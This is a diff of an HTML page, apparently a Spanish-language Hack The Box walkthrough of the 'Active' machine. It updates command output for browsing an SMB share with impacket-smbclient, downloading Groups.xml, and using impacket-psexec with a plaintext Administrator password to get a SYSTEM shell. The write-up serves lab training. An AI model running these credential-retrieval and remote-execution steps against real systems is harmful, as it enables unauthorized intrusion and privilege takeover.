@@ -192,38 +192,34 @@ Anonymous login successful
 
 <p class="plain-text">Nos conectamos al recurso Replication con smbclient donde encontramos un directorio llamado active.htb que a su vez tiene mas directorios dentro de el</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ smbclient</span><span class="p"> -N //active.htb/Replication
-Anonymous login successful
-Try "help" to get a list of possible commands.
-smb: \> dir
-  .                                   D        0  Sat Jul 21 05:37:44 2018  
-  ..                                  D        0  Sat Jul 21 05:37:44 2018
-  active.htb                          D        0  Sat Jul 21 05:37:44 2018
+<code><span class="ve">❯ impacket-smbclient</span><span class="p"> active.htb
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-		5217023 blocks of size 4096. 242406 blocks available
-smb: \> cd active.htb
-smb: \active.htb\> dir
-  .                                   D        0  Sat Jul 21 05:37:44 2018
-  ..                                  D        0  Sat Jul 21 05:37:44 2018
-  DfsrPrivate                       DHS        0  Sat Jul 21 05:37:44 2018
-  Policies                            D        0  Sat Jul 21 05:37:44 2018
-  scripts                             D        0  Wed Jul 18 13:48:57 2018
-
-		5217023 blocks of size 4096. 241699 blocks available
-smb: \active.htb\></span>
+Type help for list of commands
+# use Replication
+# ls
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 active.htb
+# cd active.htb
+# ls
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 DfsrPrivate  
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 Policies
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 scripts
+#</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Después de navegar entre los directorios dentro de otros encontramos un archivo <code class="language-plaintext highlighter-rouge">Groups.xml</code> dentro de el directorio Groups dentro de varios otros</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\> dir
-  .                                   D        0  Sat Jul 21 05:37:44 2018
-  ..                                  D        0  Sat Jul 21 05:37:44 2018
-  Groups.xml                          A      533  Wed Jul 18 15:46:06 2018
-
-		5217023 blocks of size 4096. 205728 blocks available
-smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\> get Groups.xml
-getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)  
-smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\></span>
+<code><span class="p"># cd \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups  
+# ls
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
+drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
+-rw-rw-rw-        533  Sat Jul 21 06:38:11 2018 Groups.xml
+# get Groups.xml
+#</span>
 </code></pre></div></div><br>
 </section>
 
@@ -335,14 +331,14 @@ Session completed</span>
 
 <p class="plain-text">Nos conectamos con <code class="language-plaintext highlighter-rouge">psexec</code> de impacket y como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> obtenemos una cmd ahora tenemos privilegios para poder leer la flag de root</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-psexec </span><span class="p">WORKGROUP/Administrator:Ticketmaster1968@active.htb  
+<code><span class="ve">❯ impacket-psexec </span><span class="p">active.htb/Administrator:Ticketmaster1968@10.10.10.100  
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
-[*] Requesting shares on active.htb.....
+[*] Requesting shares on 10.10.10.100.....
 [*] Found writable share ADMIN$
 [*] Uploading file EyxmRtlA.exe
-[*] Opening SVCManager on active.htb.....
-[*] Creating service bBra on active.htb.....
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service bBra on 10.10.10.100.....
 [*] Starting service bBra.....
 [!] Press help for extra shell commands
 Microsoft Windows [Version 6.1.7601]
